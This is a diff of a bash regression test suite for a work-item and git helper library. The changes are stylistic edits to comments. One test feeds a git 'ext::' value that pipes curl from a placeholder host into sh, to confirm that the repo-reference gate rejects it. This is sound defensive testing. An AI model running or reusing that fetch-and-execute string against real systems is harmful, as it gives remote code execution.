@@ -5,12 +5,12 @@
 # Regression table for scripts/hero-lib.sh.
 #
 # Scoped deliberately: only the two functions with real failure modes are
-# covered — hero_field (parses attacker-controlled repo content and feeds it to
+# covered, hero_field (parses attacker-controlled repo content and feeds it to
 # git/gh) and hero_ready_items (parses hand-written frontmatter and previously
 # aborted the caller's shell on it). The thin wrappers around them are not
 # tested; a test there would pin prose, not behavior.
 #
-# Every case below is one that was, or could again be, WRONG SILENTLY — the
+# Every case below is one that was, or could again be, WRONG SILENTLY, the
 # listing coming back empty, a value truncated, a malformed id taking the whole
 # function down. Loud failures need no regression table.
 #
@@ -161,8 +161,8 @@ cat > "$F/FLEET.md" <<'EOF'
 ```
 EOF
 
-# The heading's trailing spaces cannot live in this file — the
-# trailing-whitespace hook strips them — so they are added after the heredoc.
+# The heading's trailing spaces cannot live in this file, the
+# trailing-whitespace hook strips them, so they are added after the heredoc.
 awk '!done && /^### auth$/ { print "### auth   "; done = 1; next } { print }' "$F/FLEET.md" > "$F/FLEET.md.tmp" && mv "$F/FLEET.md.tmp" "$F/FLEET.md"
 
 check "fleet-root: found from a nested dir" \
@@ -216,7 +216,7 @@ check "repos: the outside-the-fleet reason names the resolved path" \
   "1" "$(hero_fleet_repos "$F" 2>&1 >/dev/null | grep -c "outside the fleet")"
 
 # zsh ties `path` to PATH: a `local path` in the lib empties it for the
-# function and awk vanishes — an empty registry with rc 0. Sourcing from
+# function and awk vanishes, an empty registry with rc 0. Sourcing from
 # zsh is how every SKILL.md bash block runs on macOS.
 if command -v zsh >/dev/null 2>&1; then
   check "repos: sourced from zsh, still lists" \
@@ -238,7 +238,7 @@ rm -rf "$F/.git"
 #
 # target-repo flows from HERO.md into `git ls-remote`/`git clone` as a URL.
 # hero_field blocks leading-dash/control-chars but NOT git's `ext::` transport
-# helper, which executes a shell command — the RCE this gate exists to stop.
+# helper, which executes a shell command, the RCE this gate exists to stop.
 
 # The exploit shape: passes hero_field, must be rejected here.
 hero_normalize_repo_ref 'ext::sh -c "curl http://evil|sh"' >/dev/null 2>&1
@@ -286,7 +286,7 @@ item 008-caps.md 9 "Capitalized status" "DONE" "[]"
 
 OUT="$(hero_ready_items "$W" 2>/dev/null)"
 
-# state_of FILE [LISTING] — the STATE column for FILE, defaulting to $OUT.
+# state_of FILE [LISTING]: the STATE column for FILE, defaulting to $OUT.
 state_of() { printf '%s' "${2:-$OUT}" | awk -v f="$1" '$2 == f { print $1; exit }'; }
 
 check "ready: satisfied dep is READY"        "READY"   "$(state_of 002-todo.md)"
@@ -295,7 +295,7 @@ check "ready: in-progress is active, not READY" "active" "$(state_of 004-active.
 check "ready: done items are listed"         "done"    "$(state_of 001-done.md)"
 # 007 and 7 must compare equal, or a zero-padded legacy id blocks its dependents.
 check "ready: zero-padded id resolves"       "READY"   "$(state_of 006-padref.md)"
-# A dangling reference must block, not silently resolve — and must SAY it is
+# A dangling reference must block, not silently resolve, and must SAY it is
 # dangling: nothing will ever mark a nonexistent id done, so an unnamed
 # dangling ref reads as ordinary waiting when it is actually forever.
 check "ready: dangling dep blocks"           "blocked" "$(state_of 007-dangling.md)"
@@ -311,13 +311,13 @@ check "ready: status match is case-insensitive" "done"  "$(state_of 008-caps.md)
 
 # Ids are integers by convention, but a hand-written oddball must degrade
 # gracefully: a non-numeric id used to be a FATAL arithmetic error that
-# emitted NOTHING — a caller reads that as an empty plate, not as a failure.
+# emitted NOTHING: a caller reads that as an empty plate, not as a failure.
 item 009-strid.md "AH-12" "String id" "done" "[]"
 item 00a-strdep.md "b3f2" "Depends on string id" "todo" "[ah-12]"
 OUT2="$(hero_ready_items "$W" 2>/dev/null)"
 COUNT2="$(printf '%s' "$OUT2" | grep -c . )"
 check "ready: string id does not blank the listing" "10" "$COUNT2"
-# Ids compare case-insensitively — `ah-12` must resolve against `AH-12`.
+# Ids compare case-insensitively: `ah-12` must resolve against `AH-12`.
 check "ready: string-id dep resolves case-insensitively" "READY" "$(state_of 00a-strdep.md "$OUT2")"
 
 # The store listing is data; notes belong on stderr.
@@ -341,7 +341,7 @@ success: e2e green: login under 30s
 ---
 EOF
 
-# Splitting on every ': ' truncated any value containing a colon — and
+# Splitting on every ': ' truncated any value containing a colon, and
 # `success` is the field Step 1c reads to decide whether to build.
 check "item_field: title keeps its colon" \
   "Fix auth: token refresh" "$(hero_item_field "$W/010-colon.md" title)"
@@ -351,7 +351,7 @@ check "item_field: success keeps its colon" \
 # ---------- silent-READY regressions ---------------------------------------
 #
 # Each of these reported an item as READY (or its dependent as permanently
-# blocked) with nothing on stderr — an agent would have picked up work whose
+# blocked) with nothing on stderr, an agent would have picked up work whose
 # dependencies do not exist, or skipped work that was actually unblocked.
 
 cat > "$W/011-mldeps.md" <<'EOF'
@@ -404,7 +404,7 @@ depends_on: []
 Run until `status: done` appears in the log.
 EOF
 OUT5="$(hero_ready_items "$W" 2>/dev/null)"
-# Frontmatter only — a body line must not be read as the item's own field. This
+# Frontmatter only, a body line must not be read as the item's own field. This
 # item has no status line of its own, so it defaults to `new`; if the body's
 # `status: done` were read it would show `done` instead.
 check "field: body line is not frontmatter" "new" "$(state_of 014-body.md "$OUT5")"
@@ -423,7 +423,7 @@ check "ready: empty store prints nothing" "" "$EMPTY"
 #
 # The space-delimited id sets are only sound if no id can contain the
 # delimiter. A whitespace id (`id: AH 12`) used to inject two tokens, letting
-# a dep on a NONEXISTENT id resolve — and count as done — with no warning:
+# a dep on a NONEXISTENT id resolve, and count as done, with no warning:
 # the exact silent-READY failure the dangling-dep report exists to prevent.
 
 item 016-wsid.md "WS tok9" "Whitespace id" "done" "[]"
@@ -434,21 +434,21 @@ check "ready: dep on a whitespace-id token stays blocked" "blocked" "$(state_of 
 printf '%s' "$ERR6" | grep -q "whitespace-containing id"
 check "ready: whitespace id warns on stderr" "0" "$?"
 
-# Duplicate ids (after normalization — 007 is already item 005's id) must be
+# Duplicate ids (after normalization, 007 is already item 005's id) must be
 # named: dependents may resolve against the wrong twin.
 item 018-dup7.md 7 "Duplicate of padded id 007" "todo" "[]"
 ERR7="$(hero_ready_items "$W" 2>&1 >/dev/null)"
 printf '%s' "$ERR7" | grep -q "duplicate id 7"
 check "ready: normalized duplicate id warns on stderr" "0" "$?"
 
-# An item with no usable id cannot participate in dependency order — handing
+# An item with no usable id cannot participate in dependency order, handing
 # it out as READY would have a consumer work an item nothing can depend on.
 printf 'just prose, no frontmatter\n' > "$W/019-prose.md"
 OUT7="$(hero_ready_items "$W" 2>/dev/null)"
 check "ready: id-less item is invalid, not READY" "invalid" "$(state_of 019-prose.md "$OUT7")"
 
 # discovered_from is provenance, never a blocker: a DANGLING discovered_from
-# must not block (or even warn) — the readiness engine only parses depends_on.
+# must not block (or even warn), the readiness engine only parses depends_on.
 cat > "$W/020-disc.md" <<'EOF'
 ---
 id: 20
@@ -465,7 +465,7 @@ check "ready: dangling discovered_from never blocks" "READY" "$(state_of 020-dis
 #
 # The planning state is the human ready-mark gate: emitted items sit in
 # `planning` until a person flips them to `todo`. Each case here pins a way the
-# gate could be silently defeated — an emitted item handed to one-shot with no
+# gate could be silently defeated, an emitted item handed to one-shot with no
 # ready-mark, the precise silent-READY shape this table exists to catch.
 
 item 021-planning.md 21 "Awaiting ready-mark" "planning" "[1]"
@@ -479,7 +479,7 @@ depends_on: []
 ---
 EOF
 item 024-capplan.md 24 "Capitalized planning" "Planning" "[]"
-# `plan` is the display LABEL, `planning` the keyword — an intuitive-but-wrong
+# `plan` is the display LABEL, `planning` the keyword, an intuitive-but-wrong
 # shortening that previously fell through to READY, defeating the whole gate.
 item 025-typo.md 25 "Status typo" "plan" "[1]"
 OUT9="$(hero_ready_items "$W" 2>/dev/null)"
@@ -487,8 +487,8 @@ OUT9="$(hero_ready_items "$W" 2>/dev/null)"
 check "planning: item lists as plan, not READY" "plan"    "$(state_of 021-planning.md "$OUT9")"
 check "planning: quoted planning counts"        "plan"    "$(state_of 023-qplan.md "$OUT9")"
 check "planning: capitalized planning counts"   "plan"    "$(state_of 024-capplan.md "$OUT9")"
-# A dependent of a planning item stays blocked (the id EXISTS — it is just not
-# done — so this is ordinary blocking, NOT a dangling-ref).
+# A dependent of a planning item stays blocked (the id EXISTS. It is just not
+# done, so this is ordinary blocking, NOT a dangling-ref).
 check "planning: dependent stays blocked"       "blocked" "$(state_of 022-plandep.md "$OUT9")"
 printf '%s' "$OUT9" | grep -q '022-plandep.md.*\[missing dep:'
 check "planning: dependent is not mislabeled dangling" "1" "$?"
@@ -519,7 +519,7 @@ fitem 037-fdone.md 37 "Shipped feature" "done" "[]"
 fitem 038-fcaps.md 38 "Capitalized kind" "todo" "[]" "Feature"
 fitem 039-ftypo.md 39 "Feature status typo" "in-review" "[]"
 # The extended enum is features-only: a PLAIN item claiming `ready` must stay
-# invalid — otherwise any item could skip the human ready-mark by declaring it.
+# invalid, otherwise any item could skip the human ready-mark by declaring it.
 item 040-plainready.md 40 "Plain item claiming ready" "ready" "[]"
 # Interaction fixtures: dependency resolution, legacy kinds, and the malformed
 # values that must land in the loud invalid arm, never a READY-eligible one.
@@ -535,17 +535,17 @@ fitem 046-fcolon.md 46 "Colon feature status" "plan:todo" "[]"
 item 047-notdone.md 47 "Colon done status" "not:done" "[]"
 # An unknown kind must stay VISIBLE (invalidating it hid nine items, five of
 # them security, behind a stderr line nobody reads) yet must never be handed
-# out READY — build-todo and plain-todo mean OPPOSITE things, so `kind:
+# out READY: build-todo and plain-todo mean OPPOSITE things, so `kind:
 # features` + todo reaching READY would skip the ready-mark. `backlog` is the
 # one reading safe under both.
 item 048-badkind.md 48 "Typo kind" "todo" "[]" "features"
 # Backlog rows still run the dep check: unmet deps annotate the row
-# (wayfare's report prints it) and a dangling ref warns — a bootstrap typo must
+# (wayfare's report prints it) and a dangling ref warns, a bootstrap typo must
 # not be invisible.
 fitem 049-fwait.md 49 "Backlog waiting on dep" "todo" "[30]"
 fitem 050-fdangle.md 50 "Backlog dangling dep" "todo" "[999]"
 OUTF="$(hero_ready_items "$W" 2>/dev/null)"
-# A todo feature is on the roadmap but UNPLANNED — never READY.
+# A todo feature is on the roadmap but UNPLANNED, never READY.
 check "feature: todo lists as backlog, not READY" "backlog" "$(state_of 030-backlog.md "$OUTF")"
 check "feature: planning lists as plan"           "plan"    "$(state_of 031-fplan.md "$OUTF")"
 # `ready` is the feature state eligible for READY, dep-gated like plain todo.
@@ -560,9 +560,9 @@ check "feature: unknown status is invalid"        "invalid" "$(state_of 039-ftyp
 check "feature: plain item with ready is invalid" "invalid" "$(state_of 040-plainready.md "$OUTF")"
 # A done FEATURE must count in done_ids, or every roadmap chain stalls forever.
 check "feature: dep on a done feature is READY"   "READY"   "$(state_of 041-fchain.md "$OUTF")"
-# Any known non-feature kind rides the plain arms — legacy work orders still list.
+# Any known non-feature kind rides the plain arms, legacy work orders still list.
 check "feature: kind work-order behaves as plain" "READY"   "$(state_of 042-wo.md "$OUTF")"
-# No status line means the item was just created and nobody has triaged it —
+# No status line means the item was just created and nobody has triaged it,
 # `new`, never READY. It used to default to `todo`, which for a plain item meant
 # READY-eligible: untriaged items went straight to one-shot.
 check "feature: empty status defaults to new" "new" "$(state_of 043-fnostatus.md "$OUTF")"
@@ -590,7 +590,7 @@ check "feature: backlog dangling dep warns on stderr" "0" "$?"
 # ---------- kind classes: architecture, polish, feedback, goal, new ---------
 #
 # `architecture` and `polish` share the build enum with `feature`; the feedback
-# kinds carry their own delivery enum and must NEVER be READY — nothing builds
+# kinds carry their own delivery enum and must NEVER be READY, nothing builds
 # a feedback item, it gets delivered, so handing one to one-shot is always
 # wrong.
 item 051-arch.md 51 "Planned architecture change" "ready" "[]" "architecture"
@@ -601,7 +601,7 @@ item 076-poltodo.md 76 "Card grid gutters" "todo" "[]" "polish"
 item 077-polrev.md 77 "Polish PR in review" "reviewing" "[]" "polish"
 # `security` (a bot's bump PR taken to deployment by `wayfare do`, or a
 # harden fix) rides the build enum. Left off the class table it rides the
-# unknown enum instead: ready lists as invalid, todo as backlog — never READY.
+# unknown enum instead: ready lists as invalid, todo as backlog, never READY.
 item 078-dep.md 78 "Bump lodash to 4.17.21" "ready" "[]" "security"
 item 079-deptodo.md 79 "Bump minimist" "todo" "[]" "security"
 item 080-deprev.md 80 "Bump in review" "reviewing" "[]" "security"
@@ -619,7 +619,7 @@ item 066-newfeat.md 66 "Fresh feature" "new" "[]" "feature"
 item 067-newdf.md 67 "Fresh feedback" "new" "[]" "design-feedback"
 # A dependency that is merely `new` is not done, so dependents stay blocked.
 item 068-waitnew.md 68 "Waits on a new item" "todo" "[65]"
-# A goal spans features. It is never READY — one-shot builds features, and a
+# A goal spans features. It is never READY, one-shot builds features, and a
 # goal handed to it has nothing to build.
 item 070-goalnew.md 70 "Fresh goal" "new" "[]" "goal"
 item 071-goaltodo.md 71 "Approved goal" "todo" "[]" "goal"
@@ -661,7 +661,7 @@ check "kind: feedback bad status names its own enum" "0" "$?"
 # ---------- goal coverage ----------------------------------------------------
 #
 # `wayfare next` walks goals, never items, so a planned build item outside every
-# open goal is never handed out — it sits READY until someone runs `do N` by
+# open goal is never handed out. It sits READY until someone runs `do N` by
 # hand. Sync's goals stage groups every planned item; the warning is the only
 # thing that reports the stage having been skipped or cut short.
 mkdir -p "$TMP/cov/.plans"; C="$TMP/cov/.plans"
@@ -815,7 +815,7 @@ check "covers: a two-token covers entry warns" "0" "$?"
 OUTC="$(hero_ready_items "$C" 2>/dev/null)"
 check "covers: uncovered item still lists READY" "READY" "$(state_of 002-out.md "$OUTC")"
 check "covers: uncovered implementing item still lists active" "active" "$(state_of 006-impl.md "$OUTC")"
-# A delivered feedback item is TERMINAL, so dependents on it must unblock —
+# A delivered feedback item is TERMINAL, so dependents on it must unblock,
 # otherwise a feature waiting on an upstream answer blocks forever.
 item 061-waitdf.md 61 "Waits on delivered feedback" "todo" "[56]"
 item 062-waitrej.md 62 "Waits on rejected feedback" "todo" "[57]"
@@ -829,7 +829,7 @@ item 064-waitfake.md 64 "Waits on the fake" "todo" "[63]"
 # not reach READY through ANY status. `todo` → backlog is tested above; `ready`
 # is the arm a "simplification" of the class gate would most likely open.
 item 069-badkindready.md 69 "Typo kind claiming ready" "ready" "[]" "features"
-# `hardening` — the kind behind the nine-invisible-items incident — rides the
+# `hardening`, the kind behind the nine-invisible-items incident, rides the
 # plain enum: todo is READY, ready is invalid (no skipping the ready-mark).
 item 075-hard.md 75 "Hardening task" "todo" "[]" "hardening"
 item 076-hardready.md 76 "Hardening claiming ready" "ready" "[]" "hardening"
@@ -845,7 +845,7 @@ item 081-featq.md 81 "Feature claiming queued" "queued" "[]" "feature"
 item 082-goalq.md 82 "Goal claiming queued" "queued" "[]" "goal"
 # Build-enum words on feedback and goal items must be INVALID, not aliased. A
 # feedback item at in-progress printing `active` is byte-identical to a
-# feature mid-build — the row has no kind — and tier 1 would build it.
+# feature mid-build, the row has no kind, and tier 1 would build it.
 item 083-fbprog.md 83 "Feedback claiming in-progress" "in-progress" "[]" "design-feedback"
 item 084-fbplan.md 84 "Feedback claiming planning" "planning" "[]" "design-feedback"
 item 085-fbdone.md 85 "Feedback claiming done" "done" "[]" "design-feedback"
@@ -856,7 +856,7 @@ item 087-goalplan.md 87 "Goal claiming planning" "planning" "[]" "goal"
 # shadows.
 item 088-donewskind.md 88 "Done with whitespace kind" "done" "[]" "foo bar"
 item 089-waitws.md 89 "Waits on the malformed one" "todo" "[88]"
-# id-less item claiming done: invalid, never `done` — a done row that is not
+# id-less item claiming done: invalid, never `done`, a done row that is not
 # in done_ids is a split-brain (listed finished, dependents blocked forever).
 printf -- '---\ntitle: No id, claims done\nstatus: done\ndepends_on: []\n---\n' > "$W/090-noiddone.md"
 # A dependency that is merely queued is not done.
@@ -908,7 +908,7 @@ grep -qxF ".plans/" "$R1/.git/info/exclude"
 check "store: .plans excluded in the TARGET repo" "0" "$?"
 check "store: second call is idempotent"   "$R1/.plans" "$(hero_work_store "$R1" 2>/dev/null)"
 
-# Symlink refusal — only when a migration would actually happen. A stale
+# Symlink refusal, only when a migration would actually happen. A stale
 # legacy symlink next to a healthy .plans/ must not brick the store.
 R2="$TMP/mig2"; git init -q "$R2"; ln -s /etc "$R2/my-work"
 hero_work_store "$R2" >/dev/null 2>&1
@@ -1001,7 +1001,7 @@ check "compose: commented-out HOST_PORT ignored, long-syntax published read" "77
 check "compose: no compose file is -" "-" "$(hero_compose_port "$C/d")"
 
 # Explicit-root safety: run from a NON-repo cwd, the store must land in (and
-# only mutate) the target repo — previously the exclude writes hit the cwd.
+# only mutate) the target repo, previously the exclude writes hit the cwd.
 R4="$TMP/mig4"; git init -q "$R4"
 NOREPO="$TMP/norepo"; mkdir -p "$NOREPO"
 S4="$(cd "$NOREPO" && hero_work_store "$R4" 2>/dev/null)"
@@ -1088,7 +1088,7 @@ printf -- '---\nmsg_id: m-4\ntype: ask\nstatus: NEW\n---\n' > "$W3/inbox/m-4.md"
 printf -- '---\nmsg_id: m-5\ntype: ask\nstatus: bogus\n---\n' > "$W3/inbox/m-5.md"
 printf -- '---\nmsg_id: m-6\ntype: ask\nstatus: claimed\n---\n' > "$W3/inbox/m-6.md"
 # new, missing, upper-case NEW, and a typo all count as unread; answered and
-# claimed do not — a typo that read as settled would hide a message forever.
+# claimed do not, a typo that read as settled would hide a message forever.
 check "inbox count: unread = new + missing + NEW + typo" "4" "$(hero_inbox_count "$W3")"
 check "inbox count: claimed counted separately"        "1" "$(hero_inbox_count "$W3" claimed)"
 check "inbox count: no inbox is 0"                     "0" "$(hero_inbox_count "$TMP/w/.plans")"
@@ -1138,7 +1138,7 @@ check "msg find: empty ABOUT is rc 2"         "2"   "$?"
 # forever and close the subject permanently.
 msg m-aa4444.md hiro 31 queued
 check "msg find: status outside enum is not live" "no" "$(hero_msg_find "$W3" hiro 31 >/dev/null 2>&1 && echo yes || echo no)"
-# An expired await was settled by lapse — the sender already resumed. Holding
+# An expired await was settled by lapse, the sender already resumed. Holding
 # the subject closed on it hangs the conversation with no way to reopen.
 msg m-aa5555.md hiro 32 new "expires: 2000-01-01"
 check "msg find: expired is not live"         "no"  "$(hero_msg_find "$W3" hiro 32 >/dev/null 2>&1 && echo yes || echo no)"
@@ -1174,7 +1174,7 @@ printf -- '---\nmsg_id: m-zzzzzz\ntype: ask\nfrom: hiro\nto: ds\nabout: 34\nstat
 check "deposit: rejects body msg_id mismatch" "no"  "$(hero_msg_deposit "$W3" m-dd1111 "$TMP/mismatch.md" >/dev/null 2>&1 && echo yes || echo no)"
 printf -- '---\nmsg_id: m-ee1111\ntype: ask\nfrom: hiro\nto: ds\nabout: 35\nstatus: pending\n---\n' > "$TMP/badstatus.md"
 check "deposit: rejects status outside enum"  "no"  "$(hero_msg_deposit "$W3" m-ee1111 "$TMP/badstatus.md" >/dev/null 2>&1 && echo yes || echo no)"
-# No temp may survive ANY path — a recipient's glob reading a half-message is
+# No temp may survive ANY path, a recipient's glob reading a half-message is
 # a request acted on in half. Asserted after the failure cases, not before.
 check "deposit: leaves no temp behind"        "0" "$(find "$W3/inbox" -name '.*.tmp' | wc -l | tr -d ' ')"
 if command -v zsh >/dev/null 2>&1; then
@@ -1249,7 +1249,7 @@ hero_deploy_pending_add "$DS" "$SHA_A" 41
 check "deploy pending: add is idempotent"    "2"   "$(hero_deploy_pending "$DS" | wc -l | tr -d ' ')"
 check "deploy pending: rejects a non-sha"    "no"  "$(hero_deploy_pending_add "$DS" 'not a sha' 43 >/dev/null 2>&1 && echo yes || echo no)"
 # An abbreviated sha would be added but never cleared, since clear matches the
-# whole field — the entry is re-probed and re-reported forever.
+# whole field, the entry is re-probed and re-reported forever.
 check "deploy pending: rejects a short sha"  "no"  "$(hero_deploy_pending_add "$DS" abc123 43 >/dev/null 2>&1 && echo yes || echo no)"
 # Blank is representable and, because dedupe is on the sha alone, permanent:
 # a later add carrying the number is a no-op.
@@ -1273,7 +1273,7 @@ check "deploy pending: no file left behind"  "no"  "$([ -e "$DS/.deploy-pending"
 check "deploy pending: no lock left behind"  "no"  "$([ -e "$DS/.deploy-pending.lock" ] && echo yes || echo no)"
 check "deploy pending: clearing nothing is rc 0" "yes" "$(hero_deploy_pending_clear "$DS" "$SHA_A" >/dev/null 2>&1 && echo yes || echo no)"
 # A line that lost its newline would fuse with the next append, and the fused
-# line matches no sha — both entries become unclearable.
+# line matches no sha, both entries become unclearable.
 printf '%s\t9\t2026-01-01' "$SHA_C" > "$DS/.deploy-pending"
 hero_deploy_pending_add "$DS" "$SHA_A" 45
 check "deploy pending: heals a missing final newline" "$SHA_C $SHA_A" "$(hero_deploy_pending "$DS" | cut -f1 | tr '\n' ' ' | sed 's/ $//')"
@@ -1301,7 +1301,7 @@ if [ "$FAIL" -gt 0 ]; then
   exit 1
 fi
 # Floor on the case count. Neither suite runs under `set -e`, so a setup line
-# that starts failing does not fail the run — it just stops incrementing PASS,
+# that starts failing does not fail the run. It just stops incrementing PASS,
 # and a block whose glob went empty runs zero iterations. Without this, a
 # refactor that silently stops executing 25 cases still reports 0 failures and
 # exits 0. The whole reason these cases exist is that each one could be wrong
